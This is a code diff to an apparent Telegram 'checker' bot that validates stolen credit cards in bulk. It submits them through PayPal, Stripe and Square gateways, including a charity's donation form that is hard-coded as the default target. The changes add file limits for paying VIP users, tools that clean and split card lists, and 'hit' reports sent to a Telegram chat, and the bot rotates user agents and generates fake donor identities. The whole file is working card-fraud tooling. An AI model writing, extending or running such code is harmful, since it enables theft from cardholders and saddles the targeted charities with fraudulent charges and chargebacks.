@@ -34,6 +34,7 @@ STRIPE_KEYS = {}
 pending_files = {}
 hit_counter = 0
 HIT_CHAT_ID = -1002429830194
+VIP_FILE_LIMIT = 2000
 
 try:
     with open('stripe_keys.json', 'r') as f:
@@ -72,6 +73,11 @@ PREMIUM_EMOJI_IDS = {
     "👁": "5976794472418121581",
     "💀": "5976323628038363401",
     "🛑": "6039615816595414817",
+    "🧹": "6039615816595414817",
+    "📁": "6039615816595414817",
+    "🔧": "6039615816595414817",
+    "📤": "6039615816595414817",
+    "📥": "6039615816595414817",
 }
 
 def premium_emoji(text):
@@ -87,6 +93,49 @@ def premium_emoji(text):
 
 UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
 api_semaphore = asyncio.Semaphore(6)
+
+PAYPAL_RESPONSES = [
+    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
+    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
+    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
+    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
+    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
+    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
+    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
+    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
+    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
+    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
+    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
+    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
+    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
+    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
+    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
+    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
+    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
+    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
+    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
+    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
+    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
+    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
+    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
+    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
+    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
+    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
+    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
+    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
+    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
+    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
+    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
+    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
+    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
+    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
+    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
+    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
+    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
+    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
+    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
+    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
+]
 
 async def get_bin_info(bin_number):
     urls = [f"https://bins.antipublic.cc/bins/{bin_number}", f"https://lookup.binlist.net/{bin_number}"]
@@ -113,7 +162,7 @@ async def get_bin_info(bin_number):
     return "Unknown", "Unknown", "Unknown"
 
 class PayPalCommerce:
-    def __init__(self, target_url):
+    def __init__(self, target_url=None):
         self.first_name = [
             "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
             "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua",
@@ -141,54 +190,15 @@ class PayPalCommerce:
         self.form_data = {}
         self.ajax_url = None
         self.cookies = {}
-        self.target_url = target_url
-        self.url = urlparse(target_url).netloc
-        self.inurl = urlparse(target_url).path
-        if urlparse(target_url).query:
-            self.inurl += f"?{urlparse(target_url).query}"
+        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
+        self.url = urlparse(self.target_url).netloc
+        self.inurl = urlparse(self.target_url).path
+        if urlparse(self.target_url).query:
+            self.inurl += f"?{urlparse(self.target_url).query}"
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.is_valid_gateway = True
 
-        self.paypal_responses = [
-            'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
-            'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED',
-            'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD',
-            'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED',
-            'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD',
-            'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
-            'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
-            'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
-            'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD',
-            'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED',
-            'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-            'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
-            'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
-            'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
-            'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
-            'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
-            'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
-            'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
-            'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
-            'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
-            'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
-            'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
-            'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
-            'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
-            'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
-            'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
-            'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
-            'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
-            'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
-            'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
-            'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
-            'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
-            'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
-            'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
-            'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
-            'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
-            'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
-            'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
-        ]
+        self.paypal_responses = PAYPAL_RESPONSES.copy()
 
         self.user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -205,9 +215,12 @@ class PayPalCommerce:
         self._get_client_token()
 
     def get_next_ua(self):
-        ua = self.user_agents[self.ua_index % len(self.user_agents)]
-        self.ua_index += 1
-        return ua
+        try:
+            return self.uu.random
+        except:
+            ua = self.user_agents[self.ua_index % len(self.user_agents)]
+            self.ua_index += 1
+            return ua
 
     def get_address_data(self):
         return {
@@ -274,8 +287,10 @@ class PayPalCommerce:
                         continue
             min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
             if min_inputs:
-                self.minimum_amount = max(min_inputs, key=float)
-                return
+                valid_amounts = [x for x in min_inputs if x.replace('.', '').isdigit()]
+                if valid_amounts:
+                    self.minimum_amount = max(valid_amounts, key=float)
+                    return
             self.minimum_amount = "1.00"
         except:
             self.minimum_amount = "1.00"
@@ -293,7 +308,7 @@ class PayPalCommerce:
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'accept-language': 'en-US,en;q=0.9'
             }
-            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
+            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=10)
             self.cookies = dict(response.cookies)
             html = response.text
             if self._is_not_paypal_page(html):
@@ -350,7 +365,7 @@ class PayPalCommerce:
             return None
         try:
             headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
-            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
+            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=10)
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
@@ -406,7 +421,7 @@ class PayPalCommerce:
         amounts = []
         if self.minimum_amount != "1.00":
             amounts.append(self.minimum_amount)
-        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
+        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
         headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
         for amount in amounts:
@@ -416,7 +431,7 @@ class PayPalCommerce:
             for action in actions:
                 params = {'action': action}
                 try:
-                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=10)
                     if response.status_code == 200 and response.text:
                         try:
                             json_data = response.json()
@@ -443,7 +458,7 @@ class PayPalCommerce:
         try:
             headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
             data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=10)
             if response.status_code in [200, 201]:
                 response_data = response.json()
                 if 'id' in response_data:
@@ -458,7 +473,7 @@ class PayPalCommerce:
         try:
             headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
             data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=10)
             if response.status_code in [200, 201]:
                 response_data = response.json()
                 if 'id' in response_data:
@@ -475,7 +490,7 @@ class PayPalCommerce:
         if self.access_token:
             try:
                 headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
-                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=15)
+                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=10)
                 return response
             except:
                 pass
@@ -487,7 +502,7 @@ class PayPalCommerce:
         amounts = []
         if self.minimum_amount != "1.00":
             amounts.append(self.minimum_amount)
-        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00", "250.00", "500.00"])
+        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
         headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
         actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
         for amount in amounts:
@@ -497,7 +512,7 @@ class PayPalCommerce:
             for action in actions:
                 params = {'action': action, 'order': order_id}
                 try:
-                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=10)
                     if response.status_code == 200:
                         return response
                 except:
@@ -509,11 +524,6 @@ class PayPalCommerce:
             return "DECLINED"
         text_strip = text.strip()
         text_lower = text_strip.lower()
-
-        if 'order_not_approved' in text_lower:
-            return "Payer cannot pay for this transaction."
-        if '"status":"APPROVED"' in text_lower or '"status": "APPROVED"' in text_lower:
-            return "APPROVED"
 
         if text_lower == 'true':
             return 'CHARGE 1.0'
@@ -531,36 +541,6 @@ class PayPalCommerce:
                             card = payment_source.get('card', {}) if isinstance(payment_source, dict) else {}
                             if order_status == 'COMPLETED' and card:
                                 return 'CHARGE 1.0'
-        except:
-            pass
-
-        try:
-            approve_json = json.loads(text_strip)
-            if isinstance(approve_json, dict):
-                if str(approve_json.get('status', '')).upper() == 'COMPLETED':
-                    return 'CHARGE 1.0'
-        except:
-            pass
-
-        try:
-            approve_json = json.loads(text_strip)
-            if isinstance(approve_json, dict):
-                if 'purchase_units' in approve_json:
-                    for unit in approve_json['purchase_units']:
-                        if 'payments' in unit and 'captures' in unit['payments']:
-                            for capture in unit['payments']['captures']:
-                                if capture.get('status', '').upper() == 'COMPLETED':
-                                    return 'CHARGE 1.0'
-        except:
-            pass
-
-        try:
-            approve_json = json.loads(text_strip)
-            if isinstance(approve_json, dict):
-                data = approve_json.get('data', {})
-                if isinstance(data, dict):
-                    if str(data.get('status', '')).upper() == 'COMPLETED':
-                        return 'CHARGE 1.0'
         except:
             pass
 
@@ -606,7 +586,7 @@ class PayPalCommerce:
                 he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
                 da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                 try:
-                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
+                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=10)
                     confirm_text = confirm_res.text
                     if confirm_res.status_code == 200:
                         try:
@@ -943,14 +923,13 @@ def check_auth_sync(card):
             pass
 
 async def send_hit(context, chat_id, hit_counter, username, status_text, response, gateway_name):
-    """إرسال رسالة الهيت"""
     hit_text = f"""⚡ 𝗵𝗶𝘁 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱 #{hit_counter} 📌
 - - - - - - - - - - - - - - - - - - - - - -
 ⚡ 𝐔𝐬𝐞𝐫: @{username}
 ⚡ 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
 ⚡ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>{response}</code>
 ⚡ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: {gateway_name}
-- - - - - - - - - - - - - - - - - - - - -
+- - - - - - - - - - - - - - - - - - - - - -
 🤖 checker v1"""
     try:
         await context.bot.send_message(chat_id=HIT_CHAT_ID, text=premium_emoji(hit_text), parse_mode="HTML")
@@ -966,6 +945,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
         [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
         [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
+        [InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel"), InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel")],
     ]
     await update.message.reply_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
@@ -973,13 +953,13 @@ async def free_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE)
     query = update.callback_query
     await query.answer()
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check\n• /stop - Stop mass\n• /code [key] - Activate VIP"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+    await query.edit_message_text(premium_emoji("🤖 FREE COMMANDS:\n• /start - Start\n• /cmds - Commands\n• /pp [card] - PayPal single\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check\n• /clean - Clean cards file\n• /parts [num] - Split file\n• /stop - Stop mass\n• /code [key] - Activate VIP"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def vip_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
-    await query.edit_message_text(premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+    await query.edit_message_text(premium_emoji("💎 VIP COMMANDS:\n• Upload combo file - Mass checking (Max 2000)\n• /st [card] - Stripe single\n• /sq [card] - Square single\n• /auth [card] - Auth $0 check"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
 async def admin_cmds_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1023,6 +1003,16 @@ async def check_auth_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     await query.answer()
     await query.edit_message_text(premium_emoji("🛡 Send card:\n<code>/auth [card]</code>"), parse_mode="HTML")
 
+async def clean_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("🧹 Send cards file to clean:\nFormat: <code>number|mm|yy|cvv</code>"), parse_mode="HTML")
+
+async def parts_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text(premium_emoji("📁 Send file then use:\n<code>/parts [number]</code>\n\nExample: <code>/parts 4</code>"), parse_mode="HTML")
+
 async def stats_panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1039,6 +1029,7 @@ async def back_to_start_callback(update: Update, context: ContextTypes.DEFAULT_T
         [InlineKeyboardButton("💎 VIP Commands", callback_data="vip_cmds")],
         [InlineKeyboardButton("👑 Admin Commands", callback_data="admin_cmds")],
         [InlineKeyboardButton("💳 Check", callback_data="check_panel"), InlineKeyboardButton("📊 Stats", callback_data="stats_panel")],
+        [InlineKeyboardButton("🧹 Clean Cards", callback_data="clean_panel"), InlineKeyboardButton("📁 Split Parts", callback_data="parts_panel")],
     ]
     await query.edit_message_text(premium_emoji(f"⚡ Welcome! @{username} ⚡\n- - - - - - - - - - - - - - - - - - - - - -\n🚀 Bot Status: Online"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
 
@@ -1118,7 +1109,7 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • /rmkey [id] - Remove Stripe key
 
 💎 VIP:
-• Upload combo file - Mass checking
+• Upload combo file - Mass checking (Max 2000)
 • /st [card] - Stripe single
 • /sq [card] - Square single
 • /auth [card] - Auth $0 check
@@ -1130,6 +1121,8 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
 • /st [card] - Stripe single
 • /sq [card] - Square single
 • /auth [card] - Auth $0 check
+• /clean - Clean cards file
+• /parts [num] - Split file
 • /stop - Stop mass
 • /code [key] - Activate VIP"""
     await update.message.reply_text(premium_emoji(commands_text), parse_mode="HTML")
@@ -1159,13 +1152,6 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         gateway_num = (gateway_index % len(GATEWAYS)) + 1
         gateway_url = GATEWAYS[gateway_index % len(GATEWAYS)]
         gateway_index += 1
-        
-        if 'stripe' in gateway_url.lower():
-            gateway_name = "Stripe"
-        elif 'square' in gateway_url.lower():
-            gateway_name = "Square"
-        elif 'auth' in gateway_url.lower():
-            gateway_name = "Auth $0"
     
     status, response = await check_card_api(card_full, gateway_url)
     text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Single")
@@ -1448,6 +1434,24 @@ async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file = await update.message.document.get_file()
         file_path = f"downloads/{file.file_id}.txt"
         await file.download_to_drive(file_path)
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.readlines()
+        
+        card_count = 0
+        for line in lines:
+            if re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line):
+                card_count += 1
+        
+        if user_id not in ADMINS and user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
+            if card_count > VIP_FILE_LIMIT:
+                await update.message.reply_text(premium_emoji(f"❌ Max {VIP_FILE_LIMIT} cards for VIP!\n📊 Your file: {card_count} cards"), parse_mode="HTML")
+                try:
+                    os.remove(file_path)
+                except:
+                    pass
+                return
+        
         pending_files[user_id] = {"file_path": file_path, "chat_id": chat_id}
         keyboard = [
             [InlineKeyboardButton("💳 PayPal Check", callback_data="gateway_paypal")],
@@ -1455,7 +1459,7 @@ async def handle_file_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("💳 Square Check", callback_data="gateway_square")],
             [InlineKeyboardButton("🛡 Auth $0 Check", callback_data="gateway_auth")],
         ]
-        await update.message.reply_text(premium_emoji("📁 File Received!\nChoose gateway:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
+        await update.message.reply_text(premium_emoji(f"📁 File Received!\n💳 Cards: {card_count}\n\nChoose gateway:"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))
     except Exception as e:
         await update.message.reply_text(premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")
 
@@ -1503,21 +1507,32 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
     try:
         approved = live = declined = 0
         card_counter = 0
+        total_cards = 0
+        
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            all_cards = f.readlines()
+        
+        valid_cards = []
+        for line in all_cards:
+            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
+            if match:
+                valid_cards.append(match[0])
+        
+        total_cards = len(valid_cards)
+        
+        if total_cards == 0:
+            await context.bot.send_message(chat_id, premium_emoji("❌ No valid cards found."), parse_mode="HTML")
+            return
+        
         panel_msg = await context.bot.send_message(chat_id, premium_emoji("🎯 Start Checking..."), parse_mode="HTML")
         
-        with open(file_path, 'r', encoding='utf-8') as f:
-            lines = f.readlines()
-        
-        for line in lines:
+        for card_full in valid_cards:
             if stop_users.get(user_id):
                 await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                 return
             
-            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
-            if not match: continue
-            
-            card_full = match[0]
             card_counter += 1
+            start_time = time.time()
             
             gateway_num = 0
             gateway_url = None
@@ -1526,10 +1541,11 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
                 gateway_url = GATEWAYS[(card_counter - 1) % len(GATEWAYS)]
             
             status, response = await check_card_api(card_full, gateway_url)
+            taken = round(time.time() - start_time, 2)
             
             if status == "approved":
                 approved += 1
-                text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
+                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                 msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 try:
                     await msg.pin(disable_notification=True)
@@ -1542,7 +1558,7 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
                 
             elif status == "live":
                 live += 1
-                text = await format_response(card_full, status, response, 0, gateway_url, gateway_num, user_id, "Mass")
+                text = await format_response(card_full, status, response, taken, gateway_url, gateway_num, user_id, "Mass")
                 await context.bot.send_message(chat_id, text, parse_mode="HTML")
                 
                 hit_counter += 1
@@ -1552,25 +1568,28 @@ async def process_paypal_file(file_path, chat_id, context, gateway_name="PayPal"
             else:
                 declined += 1
             
-            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-         ▬▬ [ MASS {gateway_name.upper()} ] ▬▬
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+            keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"stop_mass_{user_id}")]]
+            
+            panel = f"""⚡ {gateway_name}
+🔗 Gate #{gateway_num if gateway_num else 'N/A'}
